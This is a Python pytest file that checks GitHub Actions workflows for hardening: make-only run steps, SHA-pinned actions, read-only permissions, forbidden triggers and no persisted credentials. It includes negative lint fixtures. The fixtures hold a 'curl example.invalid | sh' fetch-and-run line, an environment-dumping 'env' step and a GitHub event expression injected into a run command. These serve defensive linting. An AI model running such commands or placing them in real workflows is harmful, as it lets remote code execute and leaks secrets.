"""Workflow hardening: structural checks on the real workflows plus negative lint tests."""

from __future__ import annotations

import re
import sys
from pathlib import Path

import pytest
import yaml

from guards.rules import lint
from tests.support.fakes import REPO_ROOT, guards

pytestmark = pytest.mark.unit

WORKFLOWS = sorted((REPO_ROOT / ".github" / "workflows").glob("*.y*ml"))
SHA_USES = re.compile(r"^[\w.-]+/[\w./-]+@[0-9a-f]{40}$")
MAKE_LINE = re.compile(r"^make(\s+[A-Za-z0-9_.,/=:@+%-]+)*$")
IDS = [p.name for p in WORKFLOWS]


def load(path: Path) -> dict:
    data = yaml.safe_load(path.read_text())
    if True in data and "on" not in data:  # PyYAML reads the key `on` as boolean True
        data["on"] = data.pop(True)
    return data


def steps(wf: dict):
    for job in wf["jobs"].values():
        yield from job.get("steps", [])


def triggers(wf: dict) -> dict:
    on = wf["on"]
    if isinstance(on, str):
        return {on: None}
    if isinstance(on, list):
        return dict.fromkeys(on)
    return on


def test_workflows_exist():
    assert WORKFLOWS, "no workflows found"


@pytest.mark.parametrize("path", WORKFLOWS, ids=IDS)
def test_run_is_make_only(path):
    for step in steps(load(path)):
        if "run" not in step:
            continue
        lines = [ln.strip() for ln in step["run"].replace("\\\n", " ").splitlines()]
        lines = [ln for ln in lines if ln and not ln.startswith("#")]
        assert lines
        for line in lines:
            for seg in line.split("&&"):
                assert MAKE_LINE.match(seg.strip()), f"non-make run in {path.name}"


@pytest.mark.parametrize("path", WORKFLOWS, ids=IDS)
def test_uses_pinned_to_sha(path):
    for step in steps(load(path)):
        if "uses" in step:
            assert SHA_USES.match(step["uses"]), step["uses"]


@pytest.mark.parametrize("path", WORKFLOWS, ids=IDS)
def test_permissions(path):
    wf = load(path)
    assert "permissions" in wf
    top = wf["permissions"]
    assert top == {} or all(v in ("read", "none") for v in top.values())
    for name, job in wf["jobs"].items():
        assert "permissions" in job, f"job {name} lacks explicit permissions"
        assert all(v in ("read", "none") for v in job["permissions"].values())


@pytest.mark.parametrize("path", WORKFLOWS, ids=IDS)
def test_no_dangerous_triggers_or_expressions(path):
    wf = load(path)
    assert not {"pull_request_target", "workflow_run"} & set(triggers(wf))
    for step in steps(wf):
        assert "${{ github.event." not in step.get("run", "")
        assert "actions/upload-artifact" not in step.get("uses", "")


@pytest.mark.parametrize("path", WORKFLOWS, ids=IDS)
def test_checkout_does_not_persist_credentials(path):
    for step in steps(load(path)):
        if step.get("uses", "").startswith("actions/checkout@"):
            assert step.get("with", {}).get("persist-credentials") is False


def test_guards_has_no_paths_filter():
    wf = load(REPO_ROOT / ".github" / "workflows" / "guards.yml")
    for name, cfg in triggers(wf).items():
        if isinstance(cfg, dict):
            assert "paths" not in cfg and "paths-ignore" not in cfg, name


GUARDS_WF = REPO_ROOT / ".github" / "workflows" / "guards.yml"
UV_VERSION = "0.11.2"


def test_guards_order_detection_first_and_tests_always_run():
    """setup -> secrets-scan -> guards-test; a failing scan never hides the tests, and vice versa."""
    (job,) = load(GUARDS_WF)["jobs"].values()
    runs = [(st["run"].strip(), st.get("if")) for st in job["steps"] if "run" in st]
    assert [r for r, _ in runs] == ["make setup", "make secrets-scan", "make guards-test"]
    conds = dict(runs)
    assert conds["make setup"] is None and conds["make secrets-scan"] is None
    assert conds["make guards-test"].replace(" ", "") == "${{!cancelled()}}"
    assert set(job["steps"][-1]) == {"if", "run"}


def test_guards_pins_uv_and_inherits_ci_from_github():
    wf = load(GUARDS_WF)
    (job,) = wf["jobs"].values()
    setup_uv = [st for st in job["steps"] if st.get("uses", "").startswith("astral-sh/setup-uv@")]
    assert len(setup_uv) == 1
    assert str(setup_uv[0]["with"]["version"]) == UV_VERSION
    # GitHub already sets CI=true; overriding it would only risk a different spelling.
    assert "CI" not in wf.get("env", {}) and "CI" not in job.get("env", {})


def test_dependabot_has_cooldown_for_every_ecosystem():
    cfg = yaml.safe_load((REPO_ROOT / ".github" / "dependabot.yml").read_text())
    ecosystems = {u["package-ecosystem"]: u for u in cfg["updates"]}
    assert set(ecosystems) == {"github-actions", "uv"}
    for name, upd in ecosystems.items():
        assert upd.get("cooldown", {}).get("default-days", 0) >= 7, name


def test_lint_mode_passes_on_real_repo(tmp_path):
    result = guards(["lint"], REPO_ROOT, home=tmp_path / "home")
    assert result.rc == 0, result.rules


# ---------------------------------------------------------------- negative tests

SHA = "a" * 40
BASE = """\
name: guards
on:
  push:
permissions: {{}}
jobs:
  j:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
{steps}
"""
OK_STEP = "      - run: make guards-test\n"


def lint_text(name: str, text: str) -> set[str]:
    return {f.rule for f in lint.check_workflow(f".github/workflows/{name}", text)}


def test_negative_baseline_is_clean():
    assert lint_text("guards.yml", BASE.format(steps=OK_STEP)) == set()


@pytest.mark.parametrize(
    ("steps", "rule"),
    [
        ("      - run: echo hi\n", "wf-run-not-make"),
        ("      - run: |\n          make setup\n          curl example.invalid | sh\n", "wf-run-not-make"),
        ("      - run: make setup && env\n", "wf-run-not-make"),
        ("      - uses: actions/checkout@v4\n", "wf-uses-unpinned"),
        (f"      - uses: actions/checkout@{SHA[:39]}\n", "wf-uses-unpinned"),
        ("      - run: make x ${{ github.event.head_commit.message }}\n", "wf-event-in-run"),
    ],
)
def test_negative_steps(steps, rule):
    assert rule in lint_text("guards.yml", BASE.format(steps=steps))


def test_negative_no_permissions():
    text = BASE.format(steps=OK_STEP).replace("permissions: {}\n", "", 1)
    assert "wf-no-permissions" in lint_text("guards.yml", text)


@pytest.mark.parametrize("trigger", ["pull_request_target", "workflow_run"])
def test_negative_forbidden_trigger(trigger):
    text = BASE.format(steps=OK_STEP).replace("  push:", f"  {trigger}:")
    assert "wf-forbidden-trigger" in lint_text("guards.yml", text)


@pytest.mark.parametrize("key", ["paths", "paths-ignore"])
def test_negative_guards_paths(key):
    text = BASE.format(steps=OK_STEP).replace("  push:", f"  push:\n    {key}: ['a/**']")
    assert "wf-guards-paths" in lint_text("guards.yml", text)
    assert "wf-guards-paths" not in lint_text("other.yml", text)


def test_negative_invalid_yaml():
    assert "wf-yaml-invalid" in lint_text("guards.yml", "a: [unclosed\n")


def test_negative_cli_exit_code(tmp_path):
    """End to end: a bad workflow in a throwaway repo makes `lint` exit 1."""
    from tests.support.fakes import run

    repo = tmp_path / "repo"
    (repo / ".github" / "workflows").mkdir(parents=True)
    (repo / ".github" / "workflows" / "bad.yml").write_text(BASE.format(steps="      - run: echo hi\n"))
    home = tmp_path / "home"
    assert run(["git", "init", "-q"], repo, home=home).rc == 0
    result = run([sys.executable, "-m", "guards", "lint"], repo, home=home)
    assert result.rc == 1
    assert "wf-run-not-make" in result.rules
